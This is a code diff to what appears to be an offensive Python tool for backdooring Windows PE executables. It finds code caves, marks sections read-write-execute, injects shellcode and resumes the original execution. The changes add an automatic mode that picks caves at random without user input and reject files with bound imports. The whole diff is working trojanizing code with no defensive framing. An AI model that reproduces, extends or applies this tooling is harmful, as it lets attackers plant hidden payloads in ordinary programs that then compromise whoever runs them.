@@ -39,6 +39,7 @@ import stat
 import time
 import subprocess
 import pefile
+import operator
 from random import choice
 from winapi import winapi
 from intel.intelCore import intelCore
@@ -83,7 +84,7 @@ class pebin():
                  CAVE_JUMPING=False, PORT=8888, HOST="127.0.0.1", SUPPLIED_SHELLCODE=None,
                  INJECTOR=False, CHANGE_ACCESS=True, VERBOSE=False, SUPPORT_CHECK=False,
                  SHELL_LEN=300, FIND_CAVES=False, SUFFIX=".old", DELETE_ORIGINAL=False, CAVE_MINER=False,
-                 IMAGE_TYPE="ALL", ZERO_CERT=True, CHECK_ADMIN=False, PATCH_DLL=True):
+                 IMAGE_TYPE="ALL", ZERO_CERT=True, CHECK_ADMIN=False, PATCH_DLL=True, PATCH_METHOD="MANUAL"):
         self.FILE = FILE
         self.OUTPUT = OUTPUT
         self.SHELL = SHELL
@@ -107,7 +108,10 @@ class pebin():
         self.ZERO_CERT = ZERO_CERT
         self.CHECK_ADMIN = CHECK_ADMIN
         self.PATCH_DLL = PATCH_DLL
+        self.PATCH_METHOD = PATCH_METHOD.lower()
         self.flItms = {}
+        if self.PATCH_METHOD.lower() == 'automatic':
+            self.CAVE_JUMPING = True
 
     def run_this(self):
         if self.INJECTOR is True:
@@ -380,7 +384,7 @@ class pebin():
         """
         Changes the user selected section to RWE for successful execution
         """
-        print "[*] Changing Section Flags"
+        print "[*] Changing flags for section:", section
         self.flItms['newSectionFlags'] = int('e00000e0', 16)
         self.binary.seek(self.flItms['BeginSections'], 0)
         for _ in range(self.flItms['NumberOfSections']):
@@ -682,19 +686,20 @@ class pebin():
         """This function finds all code caves, allowing the user
         to pick the cave for injecting shellcode."""
 
-        len_allshells = ()
+        self.flItms['len_allshells'] = ()
         if self.flItms['cave_jumping'] is True:
             for item in self.flItms['allshells']:
-                len_allshells += (len(item), )
-            len_allshells += (len(self.flItms['resumeExe']), )
-            SIZE_CAVE_TO_FIND = sorted(len_allshells)[0]
+                self.flItms['len_allshells'] += (len(item), )
+            # TODO: ADD Stub len for zeroing memory here
+            self.flItms['len_allshells'] += (len(self.flItms['resumeExe']), )
+            SIZE_CAVE_TO_FIND = sorted(self.flItms['len_allshells'])[0]
         else:
             SIZE_CAVE_TO_FIND = self.flItms['shellcode_length']
-            len_allshells = (self.flItms['shellcode_length'], )
+            self.flItms['len_allshells'] = (self.flItms['shellcode_length'], )
 
         print "[*] Looking for caves that will fit the minimum "\
               "shellcode length of %s" % SIZE_CAVE_TO_FIND
-        print "[*] All caves lengths: ", len_allshells
+        print "[*] All caves lengths: ", ', '.join([str(i) for i in self.flItms['len_allshells']])
         Tracking = 0
         count = 1
         #BeginCave=0
@@ -769,58 +774,150 @@ class pebin():
                 except:
                     print "EOF"
 
-        print ("############################################################\n"
-               "The following caves can be used to inject code and possibly\n"
-               "continue execution.\n"
-               "**Don't like what you see? Use jump, single, append, or ignore.**\n"
-               "############################################################")
-
         CavesPicked = {}
 
-        for k, item in enumerate(len_allshells):
-            print "[*] Cave {0} length as int: {1}".format(k + 1, item)
-            print "[*] Available caves: "
+        if self.PATCH_METHOD.lower() == 'automatic':
+            print "[*] Attempting PE File Automatic Patching"
+            rsrcCaves = {}
+            otherCaves = {}
+            #sort caves by type (rsrc, others)
+            for caveNumber, caveValues in pickACave.iteritems():
+                if caveValues[0] is None:
+                    continue
+                if 'rsrc' in caveValues[0].lower():
+                    if caveValues[3] >= 100:
+                        rsrcCaves[caveNumber] = caveValues[3]
+                elif caveValues[3] >= 100:
+                    otherCaves[caveNumber] = caveValues[3]
+            #serialize caves:
 
-            if pickACave == {}:
-                print "[!!!!] No caves available! Use 'j' for cave jumping or"
-                print "[!!!!] 'i' for ignore."
-            for ref, details in pickACave.iteritems():
-                if details[3] >= item:
-                    print str(ref) + ".", ("Section Name: {0}; Section Begin: {4} "
-                                           "End: {5}; Cave begin: {1} End: {2}; "
-                                           "Cave Size: {3}".format(details[0], details[1], details[2],
-                                                                   details[3], details[4], details[5],
-                                                                   details[6]))
+            payloadDict = {}
+            for k, item in enumerate(self.flItms['len_allshells']):
+                payloadDict[k] = item
+
+            # choose other Caves first.
+            trackingVar = True
 
             while True:
-                try:
-                    self.CAVE_MINER_TRACKER
-                except:
-                    self.CAVE_MINER_TRACKER = 0
+                # for tracking sections to change perms on
+                trackSectionName = set()
 
-                print "*" * 50
-                selection = raw_input("[!] Enter your selection: ")
-                try:
-                    selection = int(selection)
+                # other caves first
+                if trackingVar is True and len(self.flItms['len_allshells']) <= len(otherCaves):
+                    for ref in sorted(payloadDict.items(), key=operator.itemgetter(1), reverse=True):
+                        # largest first
+                        # now drop the caves that are big enough in a set
+                        # and randomly select from it
+                        _tempCaves = {}
+                        for refnum, caveSize in otherCaves.iteritems():
+                            if caveSize >= ref[1]:
+                                _tempCaves[refnum] = caveSize
+                        if _tempCaves == {}:
+                            # nothing? get out
+                            trackingVar = False
+                            break
 
-                    print "[!] Using selection: %s" % selection
+                        selection = choice(_tempCaves.keys())
+                        print '[!] Selected:', str(selection) + ":", ("Section Name: {0}; Cave begin: {1} End: {2}; "
+                                                                      "Cave Size: {3}".format(pickACave[selection][0], pickACave[selection][1],
+                                                                                              pickACave[selection][2], pickACave[selection][3],
+                                                                                              ))
+                        trackSectionName.add(pickACave[selection][0])
+                        #remove the selection from the dict
+                        otherCaves.pop(selection)
+                        CavesPicked[ref[0]] = pickACave[selection]
+                    break
+
+                # experience has proven that rsrc can be an unpredictable section
+                #  for patching, either do rsrc only or not at all
+                else:
+                    print "[!] Using only the .rsrc section"
+                    for ref in sorted(payloadDict.items(), key=operator.itemgetter(1), reverse=True):
+                        #largest first
+                        # now drop the caves that are big enough in a set
+                        # and randomly select from it
+                        _tempCaves = {}
+                        for refnum, caveSize in rsrcCaves.iteritems():
+                            if caveSize >= ref[1]:
+                                _tempCaves[refnum] = caveSize
+                        if _tempCaves == {}:
+                            trackingVar = False
+                            break
+                        selection = choice(_tempCaves.keys())
+                        print '[!] Selected:', str(selection) + ":", ("Section Name: {0}; Cave begin: {1} End: {2}; "
+                                                                      "Cave Size: {3}".format(pickACave[selection][0], pickACave[selection][1],
+                                                                                              pickACave[selection][2], pickACave[selection][3],
+                                                                                              ))
+                        trackSectionName.add(pickACave[selection][0])
+                        #remove the selection from the dict
+                        rsrcCaves.pop(selection)
+                        CavesPicked[ref[0]] = pickACave[selection]
+                    break
+
+            if len(CavesPicked) != len(self.flItms['len_allshells']):
+                print "[!] Did not find suitable caves - trying next method"
+                if self.flItms['cave_jumping'] is True:
+                    return 'single'
+                else:
+                    return 'append'
+
+            if self.CHANGE_ACCESS is True:
+                for cave in trackSectionName:
+                    self.change_section_flags(cave)
+
+        elif self.PATCH_METHOD.lower() == 'manual':
+            print ("############################################################\n"
+                   "The following caves can be used to inject code and possibly\n"
+                   "continue execution.\n"
+                   "**Don't like what you see? Use jump, single, append, or ignore.**\n"
+                   "############################################################")
+
+            for k, item in enumerate(self.flItms['len_allshells']):
+                print "[*] Cave {0} length as int: {1}".format(k + 1, item)
+                print "[*] Available caves: "
+
+                if pickACave == {}:
+                    print "[!!!!] No caves available! Use 'j' for cave jumping or"
+                    print "[!!!!] 'i' for ignore."
+                for ref, details in pickACave.iteritems():
+                    if details[3] >= item:
+                        print str(ref) + ".", ("Section Name: {0}; Section Begin: {4} "
+                                               "End: {5}; Cave begin: {1} End: {2}; "
+                                               "Cave Size: {3}".format(details[0], details[1], details[2],
+                                                                       details[3], details[4], details[5],
+                                                                       details[6]))
+
+                while True:
                     try:
-                        if self.CHANGE_ACCESS is True:
-                            if pickACave[selection][0] is not None:
-                                self.change_section_flags(pickACave[selection][0])
-                        CavesPicked[k] = pickACave[selection]
-                        break
+                        self.CAVE_MINER_TRACKER
                     except:
-                        print "[!!!!] User selection beyond the bounds of available caves."
-                        print "[!!!!] Try a number or the following commands:"
-                        print "[!!!!] append or a, jump or j, ignore or i, single or s"
-                        print "[!!!!] TRY AGAIN."
-                        continue
-                except:
-                    pass
-                breakOutValues = ['append', 'jump', 'single', 'ignore', 'a', 'j', 's', 'i']
-                if selection.lower() in breakOutValues:
-                    return selection
+                        self.CAVE_MINER_TRACKER = 0
+
+                    print "*" * 50
+
+                    selection = raw_input("[!] Enter your selection: ")
+                    try:
+                        selection = int(selection)
+
+                        print "[!] Using selection: %s" % selection
+                        try:
+                            if self.CHANGE_ACCESS is True:
+                                if pickACave[selection][0] is not None:
+                                    self.change_section_flags(pickACave[selection][0])
+                            CavesPicked[k] = pickACave[selection]
+                            break
+                        except:
+                            print "[!!!!] User selection beyond the bounds of available caves."
+                            print "[!!!!] Try a number or the following commands:"
+                            print "[!!!!] append or a, jump or j, ignore or i, single or s"
+                            print "[!!!!] TRY AGAIN."
+                            continue
+                    except:
+                        pass
+                    breakOutValues = ['append', 'jump', 'single', 'ignore', 'a', 'j', 's', 'i']
+                    if selection.lower() in breakOutValues:
+                        return selection
+
         return CavesPicked
 
     def runas_admin(self):
@@ -887,6 +984,10 @@ class pebin():
         else:
             self.flItms['supported'] = False
 
+        if self.flItms['BoundImportSize'] != 0:
+            print "[!] No support for Bound Imports at this time"
+            return False
+
         if self.CHECK_ADMIN is True:
             self.flItms['runas_admin'] = self.runas_admin()
 
@@ -905,6 +1006,7 @@ class pebin():
         functions to perform the binary patching.
         """
         print "[*] In the backdoor module"
+        # TODO: Take out Injector
         if self.INJECTOR is False:
             os_name = os.name
             if not os.path.exists("backdoored"):
@@ -925,6 +1027,7 @@ class pebin():
         self.flItms['LastCaveAddress'] = 0
         self.flItms['stager'] = False
         self.flItms['supplied_shellcode'] = self.SUPPLIED_SHELLCODE
+        self.flItms['CavesToFix'] = {}
 
         #pulling apis
         if self.check_shells() is False:
@@ -946,9 +1049,8 @@ class pebin():
 
         if self.set_shells() is False or self.flItms['allshells'] is False:
             return False
-        
-        #reserve space for shellcode
 
+        #reserve space for shellcode
         targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)
         # Finding the length of the resume Exe shellcode
         if self.flItms['Magic'] == int('20B', 16):
@@ -961,9 +1063,12 @@ class pebin():
         self.flItms['shellcode_length'] = shellcode_length + len(self.flItms['resumeExe'])
 
         caves_set = False
+
+        # This can be improved. TODO: add parsed caves to a tracking dict
+        #  for "single": [caves] and "jump": [caves] for that parsing
+        #  does not have to happen over and over again.
+        #  Also think about removing None from the equation?
         while caves_set is False and self.flItms['NewCodeCave'] is False:
-            #if self.flItms['NewCodeCave'] is False:
-                #self.flItms['JMPtoCodeAddress'], self.flItms['CodeCaveLOC'] = (
             self.flItms['CavesPicked'] = self.find_cave()
             if type(self.flItms['CavesPicked']) == str:
                 if self.flItms['CavesPicked'].lower() in ['append', 'a']:
@@ -971,7 +1076,7 @@ class pebin():
                     self.flItms['CodeCaveLOC'] = 0
                     self.flItms['cave_jumping'] = False
                     self.flItms['CavesPicked'] = {}
-                    print "-resetting shells"
+                    print "[!] Appending new section for payload"
                     self.set_shells()
                     caves_set = True
                 elif self.flItms['CavesPicked'].lower() in ['jump', 'j']:
@@ -1001,6 +1106,11 @@ class pebin():
             #else:
             #    caves_set = True
 
+        # Assigning code caves to fix
+        if self.flItms['CavesPicked'] != {}:
+            for cave, values in self.flItms['CavesPicked'].iteritems():
+                self.flItms['CavesToFix'][cave] = [values[6] + 5 + self.flItms['AddressOfEntryPoint'], self.flItms['len_allshells'][cave]]
+
         #If no cave found, continue to create one.
         if self.flItms['JMPtoCodeAddress'] is None or self.flItms['NewCodeCave'] is True:
             self.create_code_cave()
@@ -1013,11 +1123,13 @@ class pebin():
         targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)
         targetFile.patch_initial_instructions()
 
+        # recalling resumeExe
         if self.flItms['Magic'] == int('20B', 16):
             ReturnTrackingAddress, self.flItms['resumeExe'] = targetFile.resume_execution_64()
         else:
             ReturnTrackingAddress, self.flItms['resumeExe'] = targetFile.resume_execution_32()
 
+        # setting the final shellcode
         self.set_shells()
 
         if self.flItms['cave_jumping'] is True:
@@ -1029,7 +1141,6 @@ class pebin():
                     temp_jmp += struct.pack("<I", 0xffffffff - abs(breakupvar - len(self.flItms['allshells'][1]) - 4))
                 else:
                     temp_jmp += struct.pack("<I", breakupvar - len(self.flItms['allshells'][1]) - 5)
-
             self.flItms['allshells'] += (self.flItms['resumeExe'], )
 
         self.flItms['completeShellcode'] = self.flItms['shellcode'] + self.flItms['resumeExe']
@@ -1076,6 +1187,13 @@ class pebin():
 
         avail_shells = []
 
+        #it's time to use a python properties TODO
+        ignores = ["returnshellcode", "pack_ip_addresses",
+                   "eat_code_caves", "ones_compliment",
+                   "ones_compliment", "resume_execution"
+                   "returnshellcode", "clean_caves_stub"
+                   ]
+
         if self.flItms['Magic'] == int('10B', 16):
             self.flItms['bintype'] = winI32_shellcode
         if self.flItms['Magic'] == int('20B', 16):
@@ -1085,12 +1203,7 @@ class pebin():
             for item in dir(self.flItms['bintype']):
                 if "__" in item:
                     continue
-                elif ("returnshellcode" == item
-                      or "pack_ip_addresses" == item
-                      or "eat_code_caves" == item
-                      or 'ones_compliment' == item
-                      or 'resume_execution' in item
-                      or 'returnshellcode' in item):
+                elif item in ignores:
                     continue
                 else:
                     print "   {0}".format(item)
@@ -1102,13 +1215,14 @@ class pebin():
                 #print item
                 if "__" in item:
                     continue
-                elif "returnshellcode" == item or "pack_ip_addresses" == item or "eat_code_caves" == item:
+                elif item in ignores:
                     continue
                 else:
                     print "   {0}".format(item)
                     avail_shells.append(item)
             self.flItms['avail_shells'] = avail_shells
             return False
+
         getattr(self.flItms['bintype']("127.0.0.1", 8080, self.SUPPLIED_SHELLCODE), self.SHELL)(self.flItms, self.flItms['CavesPicked'])
 
     def set_shells(self):
@@ -1126,6 +1240,7 @@ class pebin():
         self.flItms['shellcode'] = self.flItms['shells'].returnshellcode()
         return True
 
+    #  TODO: Take this out and make it a standalone script
     def injector(self):
         """
         The injector module will hunt and injection shellcode into
